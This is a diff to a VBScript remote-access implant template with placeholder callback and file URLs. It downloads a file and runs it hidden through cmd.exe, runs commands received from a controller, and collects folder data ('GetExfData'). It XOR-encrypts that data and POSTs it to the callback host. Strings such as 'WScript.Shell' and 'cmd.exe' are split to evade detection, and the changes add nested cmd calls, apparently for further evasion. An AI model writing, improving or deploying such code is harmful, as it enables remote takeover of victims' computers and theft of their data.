@@ -5,13 +5,15 @@ Dim tmpFolder
 tmpFolder = fso.GetSpecialFolder(2)
 CONST callbackUrl = "%CALLBACK_URL%"
 
-Set oS = CreateObject ("WSc" & "ript." & "Sh" & "ell")
+
 
 Dim downloadSucceeded
 downloadSucceeded = DownloadFile("%FILE_URL%","%FILE_OUTPUT_NAME%")
 
+
+Set oS = CreateObject ("WSc" & "ript." & "Sh" & "ell")
 If downloadSucceeded Then
-    oS.run "c" & "md.e" & "xe /C start "" "" " & tmpFolder & "\%FILE_OUTPUT_NAME% & timeout 1", 0, True
+    oS.run "c" & "md.e" & "xe /C cm" & "d /c start "" "" " & tmpFolder & "\%FILE_OUTPUT_NAME% & timeout 1", 0, True
 End If
 
 
@@ -50,7 +52,7 @@ While break <> True
         exfdata = ""
         GetExfData(folderPath)
     Else
-        abc = "c" & "m" & "d /c " & coutput & " > " &  tmpFolder & "\\o.txt"
+        abc = "c" & "m" & "d /c cm" & "d /c timeout 1 & " & coutput & " > " &  tmpFolder & "\\o.txt"
         oS.run abc,0,True
 		
 		re = ""
@@ -94,8 +96,7 @@ End Function
 
 Function Post(data)
     Dim utf8ByteArray,utf8String
-    encrData = GetEncData(data, key) ' Encrypt the data using your XOR function
-     ' Convert the encrypted data to a UTF-8 byte array
+    encrData = GetEncData(data, key)
     Set xmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
     xmlHttpReq.Open "POST", callbackUrl, False
     xmlHttpReq.Send "VBSSIGNATURE:" & friendly_name & ":" & encrData
